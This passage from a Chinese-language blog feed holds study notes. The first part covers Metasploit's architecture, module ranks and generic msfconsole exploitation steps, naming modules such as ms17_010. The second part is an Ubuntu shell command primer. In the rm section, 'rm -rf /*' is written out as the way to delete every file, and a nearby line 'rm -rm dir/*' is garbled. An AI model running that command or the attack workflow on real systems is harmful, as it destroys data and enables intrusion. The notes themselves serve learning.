href="#6-metasploit" class="headerlink" title="6 metasploit"></a>6 metasploit</h3><blockquote><p><a href="https://www.metasploit.com/">official::官网</a></p></blockquote><h4 id="6-1-msf-基础"><a href="#6-1-msf-基础" class="headerlink" title="6.1 msf 基础"></a>6.1 msf 基础</h4><blockquote><p>路径：/usr/share/metasploit-framework</p><p>Metasploit 程序需要使用 <a href="https://www.postgresql.org/">official::Postgresql</a> 数据库</p><ul><li>Postgresql：用于严格的企业场景。</li><li>MySQL：用于业务简单的互联网场景。</li></ul></blockquote><ul><li><p>基础库</p><ul><li><p>metasploit基础库</p><blockquote><p>文件位于源码根目录路径下的 libraries 目录中，包括 Rex,framework-core 和 framework-base 三部分。</p></blockquote></li><li><p>Rex </p><blockquote><p>是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgresQL以及 MySQL数据库支持等。</p></blockquote></li><li><p>framework-core库</p><blockquote><p>负责实现所有与各种类型的上层模块及插件的交互接口。</p></blockquote></li><li><p>framework-base库</p><blockquote><p>扩展了framework-core，提供更加简单的包装例程，并为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块。</p></blockquote></li></ul></li><li><p>模块</p><ul><li>Aux（分为辅助模块）：漏洞探测与扫描。</li><li>Exploits（渗透攻击模块）：渗透攻击。</li><li>Post（后渗透攻击模块）：shell 之后的进一步攻击。</li><li>payloads（攻击载荷模块）：用于攻击，程序注入，设置 shell。</li><li>Encoders（编码器模块）：编码。</li><li>Nops（空指令模块）：空指令。</li></ul></li><li><p>插件</p><blockquote><p>作用：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如 Nessus、OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。</p></blockquote></li><li><p>接口</p><ul><li>msfconsole：控制终端。</li><li>msfcli：命令行。</li><li>msfgui：图形化界面。</li><li>armitage：图形化界面。</li><li>msfapi：远程调用接口。</li></ul></li><li><p>功能程序</p><blockquote><p>metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。</p><p>比如 msfpayload、msfencode 和 msfvenom 可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。</p></blockquote></li><li><p>Rank可靠性</p></li></ul><div class="table-container"><table><thead><tr><th>级别</th><th>效果</th></tr></thead><tbody><tr><td>excellent</td><td>漏洞利用程序绝对不会使目标服务崩溃，就像SQL注入、命令执行、远程文件包含、本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别</td></tr><tr><td>great</td><td>该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定的返回地址</td></tr><tr><td>good</td><td>该漏洞利用程序有一个默认目标系统，并且是这种类型软件的”常见情况“（桌面应用程序的Windows 7，服务器的2012等）</td></tr><tr><td>normal</td><td>该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测</td></tr><tr><td>average</td><td>该漏洞利用程序不可靠或者难以利用</td></tr><tr><td>low</td><td>对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于50%的利用成功率）</td></tr><tr><td>manual</td><td>该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级</td></tr></tbody></table></div><h4 id="6-2-模块使用流程"><a href="#6-2-模块使用流程" class="headerlink" title="6.2 模块使用流程"></a>6.2 模块使用流程</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"><span class="comment"># 展示信息（exploits：攻击模块）</span></span><br><span class="line">show &lt;name&gt;</span><br><span class="line"><span class="comment"># 查找模块（ms17_010：永恒之蓝）</span></span><br><span class="line">search &lt;name&gt;</span><br><span class="line"><span class="comment"># 展示参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># show完exploits后可以直接输入数字使用模块</span></span><br><span class="line">use &lt;num&gt;</span><br><span class="line"><span class="comment"># 查看相关信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 控制对象显示（-i &lt;num&gt;：切换到控制对象）</span></span><br><span class="line">sessions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看evasion</span></span><br><span class="line">show evasion</span><br><span class="line"><span class="comment"># 使用evasion</span></span><br><span class="line">use &lt;evasion&gt;</span><br><span class="line"><span class="comment"># 查看参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line"><span class="built_in">set</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 流程</span></span><br><span class="line"><span class="comment"># 设置模块</span></span><br><span class="line">&lt;exploits&gt;</span><br><span class="line"><span class="comment"># 查看参数</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 设置参数</span></span><br><span class="line"><span class="built_in">set</span> &lt;options&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 设置 payload</span></span><br><span class="line"><span class="built_in">set</span> payload &lt;payload&gt;</span><br><span class="line"><span class="comment"># 执行模块</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回到上级，退出</span></span><br><span class="line">back / <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><ul><li><p>操作系统攻击</p><ul><li>ms17_010：win7，SMB协议</li></ul></li><li><p>应用程序攻击</p><ul><li>easyfilesharing——seh：http</li></ul></li><li><p>客户机攻击</p><blockquote><p>原理：被动攻击，需要用户进行配合。（例：点击恶意链接，下载恶意插件（Flash插件经常爆出恶意漏洞））</p></blockquote><ul><li>adobe_flash——adobe_flash_hacking_team_uaf( version &lt;= 18 )：flash（自建一个恶意网页，用户访问则会被攻击）</li></ul></li></ul><h4 id="6-3-其他命令"><a href="#6-3-其他命令" class="headerlink" title="6.3 其他命令"></a>6.3 其他命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接命令,一般用于内网渗透（[*]表示连接成功，可以使用命令如get来收集信息）</span></span><br><span class="line">connect &lt;ip&gt; &lt;port&gt; </span><br></pre></td></tr></table></figure><h4 id="6-4-查找命令"><a href="#6-4-查找命令" class="headerlink" title="6.4 查找命令"></a>6.4 查找命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接查找，或精确查找</span></span><br><span class="line">search &lt;name&gt;</span><br><span class="line">search name:&lt;name&gt;</span><br><span class="line">search port:&lt;port&gt;</span><br><span class="line">search path:&lt;path&gt;</span><br><span class="line">search platform:&lt;name&gt;</span><br><span class="line">search <span class="built_in">type</span>:&lt;cmd&gt; <span class="comment"># cmd:exploit,payload,auxiliary,encoder,evasion,post,nop</span></span><br><span class="line">search cve:CVE-2017-8464</span><br><span class="line"></span><br><span class="line"><span class="comment"># 联合查找</span></span><br><span class="line">search <span class="built_in">type</span>:&lt;name&gt; name:&lt;name&gt; ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模块详细信息</span></span><br><span class="line">info &lt;name&gt;</span><br></pre></td></tr></table></figure><h4 id="6-5-注意事项"><a href="#6-5-注意事项" class="headerlink" title="6.5 注意事项"></a>6.5 注意事项</h4><ul><li>msf 中的点是无法复制的（不可见的），要复制应到控制台中复制。</li></ul><h3 id="7-内网穿透"><a href="#7-内网穿透" class="headerlink" title="7 内网穿透"></a>7 内网穿透</h3><ul><li><p>外网访问内网</p><blockquote><p><a href="https://www.cnblogs.com/devymex/p/4156378.html">给防火墙开个洞</a></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu Linux</title>
      <link href="/posts/57602ae6.html"/>
      <url>/posts/57602ae6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Ubuntu-Linux"><a href="#Ubuntu-Linux" class="headerlink" title="Ubuntu Linux"></a>Ubuntu Linux</h1><blockquote><p><a href="https://m.runoob.com/linux/linux-command-manual.html">Linux命令大全</a></p><p><a href="https://blog.csdn.net/qq_54075859/article/details/126374197">Ubuntu设置中文输入</a></p><p><a href="https://www.runoob.com/w3cnote/linux-useful-command.html">常用命令</a></p></blockquote><hr><h2 id="一、Linux-Shell"><a href="#一、Linux-Shell" class="headerlink" title="一、Linux Shell"></a>一、Linux Shell</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h3><blockquote><p>Shell接收用户指令，并协助用户完成与系统内核的交互，进而完成指令的执行。Bash就是一种代表性的Shell命令解释程序。</p></blockquote><h3 id="2-命令行"><a href="#2-命令行" class="headerlink" title="2 命令行"></a>2 命令行</h3><ul><li><p>打开命令行界面</p><ol><li>组合键：Ctrl + Alt + T</li><li>界面点击终端。</li><li>路径 /user/bin/gnome-terminal</li></ol></li><li><p>命令行提示</p><p>[ 当前用户名 @ 主机名： 当前目录]   提示符</p><ul><li>~：当前登入用户的主目录</li><li>$：普通用户的终端</li><li>#：root用户的终端</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改变Shell的工作目录</span></span><br><span class="line"><span class="built_in">cd</span> ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名 : zp  主机名 : lab  当前工作目录为 : ~（/home/zp） 普通用户终端 : $ </span></span><br><span class="line">zp@lab：~$    </span><br></pre></td></tr></table></figure></li></ul><h3 id="3-查看Shell"><a href="#3-查看Shell" class="headerlink" title="3 查看Shell"></a>3 查看Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前使用的Shell程序</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span><br><span class="line"><span class="comment"># 查看当前系统中有效的Shell程序</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shells</span><br><span class="line"><span class="comment"># 退出Shell程序</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 更改Shell信息</span></span><br><span class="line">chsh</span><br></pre></td></tr></table></figure><h3 id="4-命令"><a href="#4-命令" class="headerlink" title="4 命令"></a>4 命令</h3><h4 id="4-1-含义"><a href="#4-1-含义" class="headerlink" title="4.1 含义"></a>4.1 含义</h4><ul><li>命令   [ 选项 ]   [ 参数 ]</li><li>短命令选项前通常用 ‘ - ‘</li><li>长命令选项前通常用 ‘ — ‘</li></ul><h4 id="4-2-root权限"><a href="#4-2-root权限" class="headerlink" title="4.2 root权限"></a>4.2 root权限</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 临时切换到root账户，执行su后输入密码</span></span><br><span class="line">su    </span><br><span class="line"><span class="comment"># 临时获取root权限来执行一条需要root权限的命令</span></span><br><span class="line">sudo cmd_name [ 其他参数选项 ]</span><br></pre></td></tr></table></figure><h4 id="4-3-电源操作"><a href="#4-3-电源操作" class="headerlink" title="4.3 电源操作"></a>4.3 电源操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重启</span></span><br><span class="line">reboot</span><br><span class="line"><span class="comment"># 关机</span></span><br><span class="line">shutdown</span><br><span class="line">shutdown -h now</span><br><span class="line"><span class="comment"># 关机并切断电源</span></span><br><span class="line">poweroff  </span><br></pre></td></tr></table></figure><h4 id="4-4-查看信息"><a href="#4-4-查看信息" class="headerlink" title="4.4 查看信息"></a>4.4 查看信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出当前工作目录的名称</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="comment"># 列出目录中的内容</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">ll / <span class="built_in">ls</span> -l</span><br><span class="line"><span class="comment"># 输出系统信息</span></span><br><span class="line"><span class="built_in">uname</span></span><br><span class="line"><span class="comment"># 显示或者设置系统的主机名</span></span><br><span class="line">hostname</span><br></pre></td></tr></table></figure><h4 id="4-5-历史命令"><a href="#4-5-历史命令" class="headerlink" title="4.5 历史命令"></a>4.5 历史命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> [选项]</span><br><span class="line"></span><br><span class="line">num <span class="comment"># 查询近n条历史记录。</span></span><br><span class="line">-c <span class="comment"># 清空所有历史记录。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tip：命令只要与上一条不相同，无论是否运行成功，都会加入到历史记录中。</span></span><br><span class="line"><span class="comment"># 箭头（上，下）查询上一条和下一条命令。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重复执行上一条指令</span></span><br><span class="line">!!</span><br><span class="line"><span class="comment"># 运行历史清单中的第num中命令（负号表示倒数）</span></span><br><span class="line">! num</span><br><span class="line"><span class="comment"># 运行上一条以letter字母开头的历史命令。</span></span><br><span class="line">! letter</span><br><span class="line"><span class="comment"># 编辑并运行上一条或第num条命令（负号表示倒数）</span></span><br><span class="line"><span class="built_in">fc</span> [ num ]  </span><br><span class="line"><span class="comment"># 运行前一条命令最后的参数</span></span><br><span class="line">!$ </span><br></pre></td></tr></table></figure><h3 id="5-功能"><a href="#5-功能" class="headerlink" title="5 功能"></a>5 功能</h3><ul><li><p>tab：自动补全。</p></li><li><p>Ctrl + C：强制中断。</p></li></ul><h3 id="6-高阶技巧"><a href="#6-高阶技巧" class="headerlink" title="6 高阶技巧"></a>6 高阶技巧</h3><h4 id="6-1-管道"><a href="#6-1-管道" class="headerlink" title="6.1 管道"></a>6.1 管道</h4><ul><li><p>命令1 | 命令2 …| 命令n</p><blockquote><p>在两个命令之间设置管道时，管道符左边命令的输出就变成了右边命令的输入。</p></blockquote></li></ul><h4 id="6-2-重定向"><a href="#6-2-重定向" class="headerlink" title="6.2 重定向"></a>6.2 重定向</h4><ul><li><p>输入/输出重定向：改变输入与输出的方向。</p><blockquote><p>Linux中标准输入设备是键盘，标准输出设备是显示器。</p><p>ID：文件描述符。</p></blockquote></li><li><p>标准</p><p>| ID   | 文件名 | 类型             | 硬件   |<br>| —— | ——— | ———————— | ——— |<br>| 0    | stdin  | 标准输入文件     | 键盘   |<br>| 1    | stdout | 标准输出文件     | 显示器 |<br>| 2    | stderr | 标准错误输出文件 | 显示器 |</p></li><li><p>输出重定向</p><ul><li><p>[ 命令 ] &gt; [ 文件 ]</p><blockquote><p>将某一命令执行的输出保存到文件中，源文件存在则会覆盖源文件内容。</p></blockquote></li><li><p>[ 命令 ] &gt;&gt; [ 文件 ]</p><blockquote><p>将某一命令执行的输出保存到文件中，会添加到已经存在的文件中。</p></blockquote></li></ul></li><li><p>输入重定向：</p><ul><li><p>[ 命令 ] &lt; [ 文件 ]</p><blockquote><p>该输入重定向命令将文件的内容作为命令的输入。</p></blockquote></li><li><p>[ 命令 ] &lt;&lt; [ 分隔符 ]<br>> [ 文本内容 ]<br>> [ 分隔符 ]</p><blockquote><p>当前标准输入来自命令行的一对分隔符之间的内容</p></blockquote></li></ul></li><li><p>错误重定向：</p><ul><li><p>[ 命令 ] 2&gt; [ 文件 ]</p><blockquote><p>将某一命令执行的出错信息输出到文件中，源文件存在则会覆盖源文件内容。</p></blockquote></li><li><p>[ 命令 ] 2&gt;&gt; [ 文件 ]</p><blockquote><p>将某一命令执行的出错信息输出保存到文件中，会添加到已经存在的文件中。</p></blockquote></li></ul></li></ul><h4 id="6-3-命令排列"><a href="#6-3-命令排列" class="headerlink" title="6.3 命令排列"></a>6.3 命令排列</h4><ul><li>; ：所有命令都被执行。</li><li>&amp;&amp;：前为真才执行后。</li><li>|| ：前为假才执行后。</li><li>|：前作为后的参数。</li><li>&amp;：多条命令在后台执行。</li></ul><h4 id="6-4-命令续航"><a href="#6-4-命令续航" class="headerlink" title="6.4 命令续航"></a>6.4 命令续航</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.转义符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; \$zp &quot;</span>  输出为<span class="variable">$zp</span>。</span><br><span class="line"><span class="comment"># 2.命令续行</span></span><br><span class="line">\ + enter</span><br></pre></td></tr></table></figure><h4 id="6-5-命令替换"><a href="#6-5-命令替换" class="headerlink" title="6.5 命令替换"></a>6.5 命令替换</h4><ul><li><p>定义</p><blockquote><p>将一个命令的结果作为命令的参数。</p></blockquote></li><li><p>使用</p><ol><li>命令1$( 命令2 )</li><li>命令1`命令2`（` 在键盘esc的下方）</li></ol></li></ul><h4 id="6-6-命令别名"><a href="#6-6-命令别名" class="headerlink" title="6.6 命令别名"></a>6.6 命令别名</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义</span></span><br><span class="line"><span class="built_in">alias</span> [别名] = [需要定义别名的命令]（用 <span class="string">&quot;&quot;</span> 括起）</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line"><span class="built_in">alias</span></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line"><span class="built_in">unalias</span> [别名]</span><br></pre></td></tr></table></figure><h4 id="6-7-命令帮助系统"><a href="#6-7-命令帮助系统" class="headerlink" title="6.7 命令帮助系统"></a>6.7 命令帮助系统</h4><ol><li>man [ 选项 ] [ 名称 ]</li><li>info 命令名称</li><li>命令名称 —help</li></ol><hr><h2 id="二、文件和目录管理"><a href="#二、文件和目录管理" class="headerlink" title="二、文件和目录管理"></a>二、文件和目录管理</h2><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1 目录结构"></a>1 目录结构</h3><blockquote><p><a href="https://www.runoob.com/linux/linux-system-contents.html">全部目录</a></p><p><a href="https://zhuanlan.zhihu.com/p/422654168">目录作用</a></p></blockquote><ul><li><p>/bin</p><blockquote><p>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</p></blockquote></li><li><p>/boot</p><blockquote><p>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</p></blockquote></li><li><p>/dev </p><blockquote><p>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p></blockquote></li><li><p>/etc</p><blockquote><p>etc 是 Etcetera(等等) 的缩写，这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p></blockquote></li><li><p>/home</p><blockquote><p>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。</p></blockquote></li><li><p>/lib</p><blockquote><p>lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p></blockquote></li><li><p>/lost+found</p><blockquote><p>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p></blockquote></li><li><p>/media</p><blockquote><p>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</p></blockquote></li><li><p>/mnt</p><blockquote><p>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容了。</p></blockquote></li><li><p>/opt</p><blockquote><p>opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p></blockquote></li><li><p>/proc</p><blockquote><p>proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。</p><p>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：<br><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</code></p></blockquote></li><li><p>/root</p><blockquote><p>该目录为系统管理员，也称作超级权限者的用户主目录。</p></blockquote></li><li><p>/sbin</p><blockquote><p>s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。</p></blockquote></li><li><p>/selinux</p><blockquote><p>这个目录是 Redhat/CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p></blockquote></li><li><p>/srv</p><blockquote><p>该目录存放一些服务启动之后需要提取的数据。</p></blockquote></li><li><p>/sys</p><blockquote><p>这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。</p><p>sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。</p><p>该文件系统是内核设备树的一个直观反映。</p><p>当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p></blockquote></li><li><p>/tmp</p><blockquote><p>tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。</p></blockquote></li><li><p>/usr</p><blockquote><p>usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</p></blockquote></li><li><p>/usr/bin</p><blockquote><p>系统用户使用的应用程序。</p></blockquote></li><li><p>/usr/sbin</p><blockquote><p>超级用户使用的比较高级的管理程序和系统守护程序。</p></blockquote></li><li><p>/usr/src</p><blockquote><p>内核源代码默认的放置目录。</p></blockquote></li><li><p>/var</p><blockquote><p>var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p></blockquote></li><li><p>/run</p><blockquote><p>是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。</p></blockquote></li></ul><h3 id="2-文件类型"><a href="#2-文件类型" class="headerlink" title="2 文件类型"></a>2 文件类型</h3><blockquote><p><a href="https://blog.csdn.net/tsummer2010/article/details/104438878">文件类型信息</a></p></blockquote><ul><li><p>查看文件类型</p><p><code>ls -l  [ file ] || ll</code></p></li><li><p><a href="https://blog.csdn.net/omaidb/article/details/120090937">七种文件类型</a></p><ul><li>-：常规文件。</li><li>d：目录文件。</li><li>f：文件。</li><li>b：块设备。</li><li>c：串行端口。</li><li>l：链接文件。</li><li>p：进程文件。</li><li>s：套接字文件。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">drwxr-xr-x 2 cute cute 4096 11月 3 08:51 Desktop</span><br><span class="line"></span><br><span class="line">d：目录文件。</span><br><span class="line">rwxr-xr-x：文件的权限，属主、属组、其他人的权限（r读，w写，x执行，-无权）。</span><br><span class="line">2：文件的硬连接数。</span><br><span class="line">cute：属主。</span><br><span class="line">cute：属组。</span><br><span class="line">4096 ：文件的大小，对于目录而言：只是目录本身的大小，而不是里面内容的大小。</span><br><span class="line">11月 3 08:51 ：默认是文件的修改时间。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件类型信息。</span></span><br><span class="line">file [文件]</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-目录管理"><a href="#3-目录管理" class="headerlink" title="3 目录管理"></a>3 目录管理</h3><h4 id="3-1-一般参数"><a href="#3-1-一般参数" class="headerlink" title="3.1 一般参数"></a>3.1 一般参数</h4><ul><li>-i：询问。</li><li>-f：不询问。</li><li>-v (—verbose)：提示。</li><li>-r：递归子。</li><li>-p：递归父。</li></ul><h4 id="3-2-touch"><a href="#3-2-touch" class="headerlink" title="3.2 touch"></a>3.2 touch</h4><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-touch.html">touch</a></p><p>创建新文件或修改文件属性。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> -para &lt;file&gt;</span><br><span class="line"></span><br><span class="line">-a <span class="comment"># 修改文件的读取时间记录（access time）（当前时间）</span></span><br><span class="line">-m <span class="comment"># 修改文件的修改时间记录（modify time）（当前时间）</span></span><br><span class="line">-c <span class="comment"># 不创建新文件</span></span><br><span class="line">-d <span class="comment"># 设定时间与日期,可以使用各种不同的格式</span></span><br><span class="line">-t <span class="comment"># 设定档案的时间记录,格式与date命令相同（20011230123456）=（2001.12.30 12:34:56）</span></span><br><span class="line">-r <span class="comment"># 使用参考档的时间记录,与 --test 的效果一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件属性</span></span><br><span class="line"><span class="built_in">stat</span> &lt;file&gt;</span><br></pre></td></tr></table></figure><h4 id="3-3-cp"><a href="#3-3-cp" class="headerlink" title="3.3 cp"></a>3.3 cp</h4><blockquote><p><a href="https://m.runoob.com/linux/linux-comm-cp.html">cp</a></p><p>复制文件或目录。  </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 源可以是多个，目的只有最后一个（有多个源的话目的要是目录）</span></span><br><span class="line"><span class="built_in">cp</span> [options] sourse dest </span><br></pre></td></tr></table></figure><h4 id="3-4-ln"><a href="#3-4-ln" class="headerlink" title="3.4 ln"></a>3.4 ln</h4><blockquote><p>创建链接文件</p><p><a href="https://zhuanlan.zhihu.com/p/414331203">软链接与硬链接</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ln 参数 链接目标 链接</span></span><br><span class="line"><span class="built_in">ln</span> [options] ... [-T] TARGET LINK_NAME</span><br><span class="line"></span><br><span class="line"><span class="comment"># 硬链接：不带参数</span></span><br><span class="line"><span class="comment"># 软连接（符号连接）：-s</span></span><br></pre></td></tr></table></figure><h4 id="3-5-mv"><a href="#3-5-mv" class="headerlink" title="3.5 mv"></a>3.5 mv</h4><blockquote><p>移动文件或目录</p><p><a href="https://www.runoob.com/linux/linux-comm-mv.html">mv</a></p><p>mv可以用来改名改名。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mv [选项] [源文件|目录] [目标文件|目录]</span></span><br><span class="line"><span class="built_in">mv</span> -para src dest</span><br></pre></td></tr></table></figure><h4 id="3-6-rm"><a href="#3-6-rm" class="headerlink" title="3.6 rm"></a>3.6 rm</h4><blockquote><p>删除文件或目录</p><p><a href="https://www.runoob.com/linux/linux-comm-rm.html">rm</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#rm [选项] [文件|目录]</span></span><br><span class="line"><span class="built_in">rm</span> -para file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除Linux中所有文件</span></span><br><span class="line"><span class="built_in">rm</span> -rf /* </span><br><span class="line"><span class="comment"># 删除目录下所有文件而不删除目录</span></span><br><span class="line"><span class="built_in">rm</span> -<span class="built_in">rm</span> <span class="built_in">dir</span>/*</span><br></pre></td></tr></table></figure><h3 id="4-目录操作"><a href="#4-目录操作" class="headerlink" title="4 目录操作"></a>4 目录操作</h3><h4 id="4-1-pwd"><a href="#4-1-pwd" class="headerlink" title="4.1 pwd"></a>4.1 pwd</h4><blockquote><p>（print working directory）显示当前工作目录路径  。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><h4 id="4-2-cd"><a href="#4-2-cd" class="headerlink" title="4.2 cd"></a>4.2 cd</h4><blockquote><p>改变工作目录</p><ul><li><code>.</code>：当前目录。</li><li><code>..</code>：当前目录的父目录。</li><li><code>~</code> ：当前用户的主目录。 </li></ul></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd [目录]</span></span><br><span class="line"><span class="built_in">cd</span> path</span><br></pre></td></tr></table></figure><h4 id="4-3-ls"><a href="#4-3-ls" class="headerlink" title="4.3 ls"></a>4.3 ls</h4><blockquote><p> 列出目录下的档案或目录</p><p><a href="https://www.runoob.com/linux/linux-comm-ls.html">ls</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls [选项] [目录|文件]</span></span><br><span class="line"><span class="built_in">ls</span> -para file</span><br></pre></td></tr></table></figure><h4 id="4-4-mkdir"><a href="#4-4-mkdir" class="headerlink" title="4.4 mkdir"></a>4.4 mkdir</h4><blockquote><p>创建指定名称的目录 </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mkdir [选项] 目录...</span></span><br><span class="line"><span class="built_in">mkdir</span> -para file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定权限(类似 chmod，而不是 rwxrwxrwx 减 umask)</span></span><br><span class="line">-m (--mode) &lt;mode&gt; </span><br><span class="line"><span class="comment"># 创建多个目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -v zp&#123;1..10&#125;</span><br></pre></td></tr></table></figure><h4 id="4-5-rmdir"><a href="#4-5-rmdir" class="headerlink" title="4.5 rmdir"></a>4.5 rmdir</h4><blockquote><p>删除目录 </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rmdir [选项] [目录名]</span></span><br><span class="line"><span class="built_in">rmdir</span> -para file</span><br></pre></td></tr></table></figure><hr><h2 id="三、用户与用户组"><a href="#三、用户与用户组" class="headerlink" title="三、用户与用户组"></a>三、用户与用户组</h2><h3 id="1-用户账户"><a href="#1-用户账户" class="headerlink" title="1 用户账户"></a>1 